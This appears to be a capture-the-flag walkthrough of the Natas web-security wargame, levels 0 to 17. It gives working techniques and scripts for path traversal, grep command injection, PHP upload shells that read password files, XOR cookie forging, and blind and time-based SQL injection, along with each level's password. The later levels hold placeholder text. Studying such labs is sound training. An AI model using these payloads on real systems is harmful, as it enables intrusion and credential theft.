# Wargames - Natas Walkthrough

Walkthrough of the natas wargames series on [OvertheWire][OTW].

Natas is a big change from Bandit and Leviathan, focussing on web security
rather than secure shell (ssh). For this reason, every natas level begins
by entering http://natasX.natas.labs.overthewire.org, where X is the number
of the level.

> Password for natas0: natas0

### Natas0

For the first level, we're informed that we can find the password for the next
level somewhere on the page. The first thing we can try with any web
infiltration exercise is to examine the source of the page (CTRL-U on Firefox).

Here, the password is easily visible to us in an HTML comment. We can simply
copy, paste, and move on.

> Password for natas1: gtVrDuiDfck831PqWsLEZy5gyDz1clto

### Natas1

Another very similar level - this one informs us that this time, right-clicking
has been blocked. For my version of Firefox, this certainly wasn't the case
and I could simply right-click and select "View Page Source". CTRL-U will also
still work, and alternatively it's very simple to use the toolbar, and go
via Tools > Web Developer > Page Source.

Anyway, we find the source, and find our password in the comments again.

> Password for natas2: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

### Natas2

For natas2, we enter the same page, but this time we need to do a little bit
more than just inspecting the source. When we inspect, we see that there is also
an image on the webpage - a 1x1 image of a single blank pixel.

When we click the link to observe the image, we are taken to the location of
the image in the server, in a folder called /files. If we remove the image
from the URL, we are allowed access into the /files directory itself, where
we find another file present: users.txt. Clicking on this will show a file
with some usernames and some passwords, one of which is natas3, and the answer
to this exercise.

> Password for natas3: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

### Natas3

Again we inspect the source, but this time are informed by an HTML comment
that there are no information leaks this time - being told that: "Not even
Google can find this one...". This is actually a significant clue: search
engines create databases of results by sending **web-crawlers** to all
websites they can find, and probing for information. A website however
can instruct search engines not to do so, by creating a **robots.txt** file
at the root of the domain.

If we head to natas3.natas.labs.overthewire.org/robots.txt, we find the
following:

```
User-agent: *
Disallow: /s3cr3t/
```

What this means, is **ALL** web crawlers (\* means any possible pattern) should
not seek out any information from /s3cr3t/, and should not post it as a search
result.

If we head to /secret/ we discover another users.txt file, containing the
password for the next level.

> Password for natas4: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

### Natas4

In natas4, upon entering the page we are informed that access has been denied
to us, as we are visiting from "", and we must come from
"http://natas5.natas.labs.overthewire.org/". This is confusing, but we get
another clue by clicking the link to refresh the page, where we are now again
denied access, but are now told that we have come from 
"http://natas4.natas.labs.overthewire.org/".

What is occurring here, is that the php file responsible for displaying our
page, is checking a value called the **HTTP referer** (the misspelling has
been in place since its creation) - which has the value of the webpage that
is linked to the current page. What we need to do is to spoof the value of
this HTTP referer, as "http://natas5.natas.labs.overthewire.org/". This value
is one in a field of "Request Headers".

We can do this by first loading the page unsuccessfully again, and opening
Firefox Developer tools another time. We head to the "Network" tab of our
toolbox, and we can see all of the GET requests our browser has made for
information, of interest to us is the "index.php" file, which is the page we
are seeing.

We can click on the index.php request, and view the Headers in the right-hand
window. At the top, we have an option to "Edit and resend" the request for
our page, and when we do so we have an option to specify new Request Headers.
If we add a line in this box like so:

```
Referer: http://natas5.natas.labs.overthewire.org/
```

Then a new interaction will appear in the Network tab, if we right click and
copy the response information, we can paste it elsewhere to find the HTML
content of the page with an "Access granted" message, and the password for
natas5.

> Password for natas5: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

### Natas5

natas5 immediately informs us that we are not logged in, and thus cannot
gain access. For this exercise, we head a few tabs over in the Dev tools to
the "Storage Inspector". Here we can see the cookies for the current page,
and one cookie stands out in how clear it is, and it's domain, a cookie called:
**loggedin**. We double click the value of '0', and change it to a '1', and
after reloading the page we meet a new message containing the natas6 password.

> Password for natas6: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

### Natas6

In natas6, we have a submission form asking for a password. We could try
guesses at random, but thankfully there is also a clue handed to us in the form
of the original source code: including a php section that would otherwise be
hidden to us.

In this php code, we can see an 'if' statement present, that checks to see
if there is a key inside of the array $\_POST corresponding with the "submit"
id. Then checks to see if the password matches up. Our best clue however,
is the file that has been included: "/includes/secret.inc". If we head to
this URL, we find a blank file, but if we inspect the source for the page we
find a definition for "secret".

Copy this string, paste it into our input box and we receive the password for
natas7.

> Password for natas7: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

### Natas7

For the first time, we have more than one webpage to work with: now we can
access either the "Home" or "About" page of natas7. Neither is significantly
different from the other however, but each contains a hint in the form of an
html comment informing us that the password for natas8 can be found at
/etc/natas_webpass/natas8.

We gain another valuable clue by messing around with our URL, changing it from:

```
http://natas7.natas.labs.overthewire.org/index.php?page=home
```

to

```
http://natas7.natas.labs.overthewire.org/index.php?page=hello
```

Suddenly we have a message telling us that we could not find the file "hello"
in /var/www/natas/natas7/index.php. This gives us some insight into the
structure of the website's backend. If we change the "page" value to the path
that we want, `/etc/natas_webpass/natas8`, then we immediately find the
information we've been looking for.

> Password for natas8: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

### Natas8

natas8 bears great similarity to natas6 in appearance, and similarly gives us
the opportunity to take a look at the source code. This time, we have an
encoded secret variable, to be compared to the submitted password after
undergoing several steps of processing. We can see these stages in the function
encodeSecret.

To reverse engineer the password, we must go through these steps:

1. Convert the hexadecimal value into binary.
2. Reverse the resultant binary string.
3. Decode the result with base64.

There's a lot of freedom in how you go about this, you can go step by step,
but I chose to create a de-encode php file:

```
<?php
	echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));
?>
```

Then by running `php myfile.php`, I received the password for the input, and
thus the password for natas9.

> Password for natas9: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

### Natas9

More finding answers from php source code. In natas9 we submit a word, which
becomes "needle" in our php code. $\_REQUEST is a global variable that
always exists in php, it is an array that will contain the values of $\_GET,
$\_POST, and $\_COOKIE.

The first `if` statement in this php code checks to see if "needle" exists
within our request, we can see this value of needle in the address bar
following a request: `http://natas9.natas.labs.overthewire.org/?needle=example`.

Then, it will assign a value to "$key", whatever the value of "needle" is.

Finally, it performs a `grep` search in the file "dictionary.txt" for the word
$key, which will be whatever we submitted (the `-i` option tells grep to
ignore case).

The security issue here, is that we are inputting text that will become a part
of a command that is executed by the php script. We can therefore add whatever
we would like to this grep command, and what we would like is to know the
contents of the /etc/natas_webpass/natas10 file.

So, we enter `"" /etc/natas_webpass/natas10`, and the final grep command will
become:

```
grep -i "" /etc/natas_webpass/natas10 dictionary.txt
```

Now, the grep command will search for everything (which is why we use an empty
string "") in the /etc/natas_webpass/natas10 file and the dictionary.txt file.
It takes our input as an additional argument to grep. The entire dictionary
content will be printed, but not before the password to natas10.

> Password for natas10: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

### Natas10

I'm not entirely sure what is up with this challenge compared to the last one,
I think there may have been another solution for natas9 involving input with 
characters '&' and/or ';', as the php source code for natas10 involves an `if` 
statement with `preg_match` for these characters (`preg_match` performs a
regular expression search).

Anyway, the solution for natas9 still works perfectly fine here, and can
get the password for natas11.

> Password for natas11: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

### Natas11

natas11 features a script several times bigger than any seen before, but we
luckily receive a big clue in "Cookies are protected with XOR encryption".

If we look at the script, we can see that several functions are created, but
the order they are called in is as followed:

1. A default data array containing "showpassword" = no and "bgcolor" = #ffffff
is created.
2. A data array ($data) is created based on the defaultdata, using the
loadData() function.
  1. $\_COOKIE is an array of cookie information, and is defined in the global
  scope.
  2. A variable $mydata is copied from the default data array.
  3. An `if` statement checks to see if there is a cookie named "data". If not,
  the default data array is returned and the function ends. This is what will
  occur upon the initial page load, as no cookie exists yet.
  4. A $tempdata variable is created by base_64 decoding the cookie data, then
  XOR encrypting it, then json decoding the object into a php array variable.
  5. If the tempdata variable is an array, and contains fields with the key
  names "showpassword" and "bgcolor", then the function does not simply return
  the default data set.
  6. If any of the characters in a preg_match function are found in the bgcolor
  field of tempdata, then the mydata variable "showpassword" and "bgcolor"
  fields are set to those of tempdata.
  7. The mydata variable is returned.
3. If the "bgcolor" field exists in $\_REQUEST, the "bgcolor" of $data is set
to this value.
4. The cookie data is saved in a saveData function, which uses the php function
`setcookie`. This means that upon the next page load, $\_COOKIE will be used
to select the bgcolor instead of the default data array.
5. Finally, within the html the bgcolor is set depending on the $data variable;
which may or may not have been effected by cookies. And most importantly, if the
data variable has the field "showpassword" set to "yes", then the natas12
password will be displayed to us.

So what we need to do, is to take the cookie data, and figure out how we need
to edit it to change the "showpassword" variable to "yes". But there is an
additional problem - we don't know the key that was used for the XOR encryption
step.

My solution for this exercise required a good deal of code, designed to take
the cookie string that we have in our browser - and brute force attempts at
finding the XOR encryption key - using the information we have about the output:
We know that the json_encoded data is represented in the format
"{"showpassword":"no","bgcolor":"#ffffff"}". We can test every character value
with XOR encryption to find the one that gives us '{' as the first character,
then again for '"' as the second character, and so on:

PHP code to determine XOR encryption key.
```
function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function find_xor_key($in) {
    $key = '';
    $text = $in;
    $outText = 'x';
	$firstChars = "{\"showpassword\":\"no\"";
	$testcharbyte = 32;
	$i = 0;
	$keylenfound = 0;

	while ($outText[$i] != $firstChars[$i] && $i < strlen($firstChars))
	{
		$outText = substr($outText, 0, -1);
		$key[$i] = '' . chr($testcharbyte);
		$outText .= $text[$i] ^ $key[$i % strlen($key)];
		if ($outText[$i] == $firstChars[$i]) {
			$outText .= 'x';
			if ($key[0] == chr($testcharbyte) && $i > 0) {
				$testResult = xor_encrypt($text, substr($key, 0, -1));
				if ($testResult[strlen($testResult) - 1] == '}')
					return substr($key, 0, -1);
			}
			$i++;
			continue ;
		}
		$testcharbyte++;
		if ($testcharbyte == 126) {
			$testcharbyte = 32;
		}
	}

    return $key;
}

$testarray = array( "showpassword"=>"no", "bgcolor"=>"#424242" );
$jsonArray = json_encode($testarray);
$testencrypt1 = base64_encode(xor_encrypt($jsonArray, 'Passw!rd'));
echo $testencrypt1 . "\n";
$keyValue = find_xor_key(base64_decode(urldecode($testencrypt1)));
echo $keyValue . "\n";
```

The code outside of the functions above exists to test the functionality of the
code, upon returning a key value of "Passw!rd", which was the value I was
testing for, I added the actual cookie data:

```
$cookiedata = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSQwp%2BQ0MKaAw%3D";
$keyValue = find_xor_key(base64_decode(urldecode($cookiedata)));
echo $keyValue . "\n";
```

Now, the code will find the encryption key actually in use by natas11: **qw8J**.
Finally, knowing the code, we can create our own desired array, crucially
containing the "showpassword" field with a "yes" value, and produce cookie
data from it using the same encryption key used by natas11:

```
$targetarray = array( "showpassword"=>"yes", "bgcolor"=>"#424242" );
echo urlencode(base64_encode(xor_encrypt(json_encode($targetarray), 'qw8J'))) .
	"\n";
```

We copy the output into our browser, and refresh the page to find the natas12
password waiting for us.

> Password for natas12: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

### Natas12

Now we learn about how to exploit the uploading of files, first with the most
basic exploitation of all. We are prompted to upload an image file, and are
free to take a look at the source code for how it will be processed and added
to the server. Observing the source code however, we see that the file
extension is taken from a variable called "filename", which we can find as a
hidden input on the upload page. If we change the value of this filename to
"file.php", and upload a php file (shown below) instead of an image file, then
the page refreshes showing a link to our file, and when we click the link,
we find our password.

```
<?php
$password = file_get_contents('/etc/natas_webpass/natas13');
echo $password;
?>
```

> Password for natas13: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

### Natas13

Another file upload, but this time we are told that only image files will be
accepted. If we take a look at the source code this time, we find that there
is some new code containing the function `exif_imagetype`. After a look at the
manual for this function 
([here](https://www.php.net/manual/en/function.exif-imagetype.php)),
we see that it only checks the first few bytes of an image to discover what
type of image it is. So our solution, is to upload the same code we did before,
but this time, sneakily appended to the end of an actual image file.

Upon clicking the link after uploading, we'll see the output from the first
bytes of our "image" file, followed by the password for natas14.

> Password for natas14: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

### Natas14

We're finished with uploading files for the moment, and are onto something new:
MySQL queries. SQL stands for Standard Query Language, and is used to
communicate with a database. We're going to learn how to do a basic SQL
injection.

The various functions in the natas14 source code do the following:

* `mysql_connect`: Search for a database at the server (arg 1) using the 
username (arg 2) and password (arg 3). In this case: localhost, natas14
and <censored>.
* `mysql_select_db`: Selects current active database on the server associated
with the the specified link identifier. In this case: the database is named
natas14.
* `mysql_query`: Sends a query (arg 1) to the active database on the server
given (arg 2). Returns resources upon success, the number of rows that
were returned can be found with `mysql_num_rows()`.
* `mysql_num_rows`: Get number of rows that were returned by `mysql_query`.

From the source code, we can see that `$query` is defined by the username and
password that we supply. It will select all rows (\*) from users where
username and password are those supplied. A normal with name "anythingatall"
and password "ChelseaSuck" would look like this:

```
SELECT * from users where username="anythingatall" and password="ChelseaSuck";
```

This query will return all data from the 'users' database for any user
matching the username and password. SQL injection is a very simple concept:
we're going to insert text in our input that will alter interpretation of
the query. As we can see, the fields are separated by double quotes, so we
want to use double quotes to separate our fake password, and a new piece of
SQL code: user = `anythingatall`, password = `ChelseaSuck" OR "1=1`. This will
change the query to:

```
SELECT * from users where username="anythingatall" 
and password="ChelseaSuck" OR "1=1";
```

`1=1` will always evaluate as true, so we will receive all rows from the
database users. Upon entry of this password, we are rewarded with the natas15
password.

> Password for natas15: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

### Natas15

In this exercise, we need to find the 32-byte password for the username
"natas16" from our SQL database. We can retrieve this data easily from our SQL
query, just as in natas14, but unfortunately this time, we cannot simply read
the information from our query. The only information we get from our query
is whether it was successful (**TRUE** result) or unsuccessful
(**FALSE** result).

There is a particular type of SQL injection for these conditions:
**blind-based SQL injection**. We test different conditions, and see whether
we get a success or fail return from our query. In this example, we test the
first character of natas16's password, with a query like this (the part in
curly braces is our injection, and 'X' as our character):

```
SELECT * from users where username="{natas16" AND SUBSTRING(password,1,1)
LIKE BINARY "X}"
```

If 'X' is the first letter of the password, the query will return successful,
and we receive the 'This user exists' response (our **TRUE** return). If 'X' is
not the first letter of the password however, the query will return an error,
and we receive the 'Error in query' response (our **FALSE** return).

To automate this process, as it would take hours to complete it manually, we
can use the Requests library for python for our attempts, in natas15.py:

```
import re
import requests as req
from requests.auth import HTTPBasicAuth

i = 1
LOGIN = 'http://natas15.natas.labs.overthewire.org'
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
passwd = ''

for i in range(1,33):
    for char in chars:
        payload = {'username':'natas16"' + 
                'AND SUBSTRING(password,1,' + str(i) + ')' +
                ' LIKE BINARY"' + passwd + char} 
        r = req.post(LOGIN, auth=HTTPBasicAuth('natas15',
            'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data=payload)
        if (re.search('This user exists',r.text)):
            passwd += char
            print (passwd)
            i += 1
			break
```

The code will access the natas15 page with our injection input (payload). The
query will check the first 'i' characters of the password, until all 32
characters have been deduced. After testing the query, the `if` statement
will check to see if the query returned **TRUE**, and if so, our password
will be extended by the new character and we'll move on to querying the next.

If we run:

```
python natas15.py > natas15.out
```

Then we can see the output from our code, the first successful query for each
character of the password, until the eventual solution is found.

> Password for natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

### Natas16

natas10 was no challenge at all, as our natas9 solution was still perfectly
viable. natas16 on the other hand, returns to grep-exploitation, and this time
the characters ``;|&\`\'"`` are all going to be checked for with `preg_match` -
killing our previous solution.

Luckily for us though, the characters `$` and `()` are still permitted, which
allows us to execute a command in a subshell during the grep call (this is
a feature of bash, see [here][GNULINK].

So we are free to make one command, however we will be unable to see the output
from it, so calls to `cat` are useless. Instead the output will be used within
a grep command. We can manipulate this into a similar format as natas15:

1. We use a grep command to read /etc/natas_webpass/natas17, and supply a
string as a guess - specifying that the string is at the beginning of the
password.
	1. If the string is present, **our** grep will return the
password, which will then be used to search "dictionary.txt" with a **second**
grep - this second grep will return **NO RESULTS**, as our password is
clearly not present in the dictionary file.
	2. If the string is NOT present, **our** grep returns an empty string,
and therefore the **second** grep will return **everything** in the dictionary.
2. We check the output - if present, our guess as to the start of the string
is incorrect. If not present, then our guess so far is correct.

We will use the `grep` command with `^` preceding our string, this specifies
that the string must be at the **START** of the searched text. This is what
allows us to guess character by character from the beginning to the end of
the string.

In python:

```
import re
import requests as req
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
LOGIN = 'http://natas16.natas.labs.overthewire.org'
password = ''

def check_if_in_pass(string):
    needle = '$(grep ^' + string + ' /etc/natas_webpass/natas17)'
    payload = {'needle':needle} 
    r = req.post(LOGIN, auth=HTTPBasicAuth('natas16',
        'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=payload)
    if not (re.search('African',r.content)):
        return True
    return False

i = 0
for i in range(0, 32):
    for char in chars:
        if (check_if_in_pass(password + char)):
            password += char
            print (password)
            break
    i += 1
```

Just as in natas15, this code will determine the password character by
character, until the final string is the total password.

> Password for natas17: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

### Natas17

natas17 is identical to natas15 with one key difference: all of the output from
queries is now commented out, so we can't use the output for our testing any
more. SQL has a function however that we can test for: we can add a line
**SLEEP(5)** into our sql injection (text in between {} is our injection,
X is the string to test):

```
SELECT * from users where username="{natas18" AND SUBSTRING(password,1,end)
LIKE BINARY "X" AND SLEEP(5)#}"
```

We also need to end our query with a '#'. When a query is tested with
conditions, it ends at the first FALSE condition. So in our query,
username=natas18 will always evaluate as TRUE, and for most of our guesses,
SUBSTRING(password,1,end) LIKE BINARY "X" will evaluate as FALSE - and each
query will be relatively fast.

For our correct guesses however, SUBSTRING(password,1,end) LIKE BINARY "X" will
evaluate as TRUE, and thus SLEEP(5) will be executed. As such, whenever we
correctly guess a new character, the query will take much longer, over 5
seconds.

Our code reflects our new test criteria, using the **time** module to check
how long each query takes.

```
import time
import re
import requests as req
from requests.auth import HTTPBasicAuth

i = 1
LOGIN = 'http://natas17.natas.labs.overthewire.org'
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
passwd = ''

for i in range(1,33):
    for char in chars:
        payload = {'username':'natas18"' + 
                'AND SUBSTRING(password,1,' + str(i) + ')' +
                ' LIKE BINARY"' + passwd + char + '" AND SLEEP(5)#'} 
        start_time = time.time()
        r = req.post(LOGIN, auth=HTTPBasicAuth('natas17',
            '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'), data=payload)
        if (time.time() - start_time > 5):
            passwd += char
            print (passwd)
            i += 1
            break
```

The code will take around 3 minutes to complete, but will print out the
password as it is determined to show us it's functioning.

> Password for natas18: xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP

### Natas18

Text

> Password for natas19: 

### Natas

Text

> Password for natas: 

[OTW]: https://overthewire.org
[GNULINK]: http://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Command-Substitution)
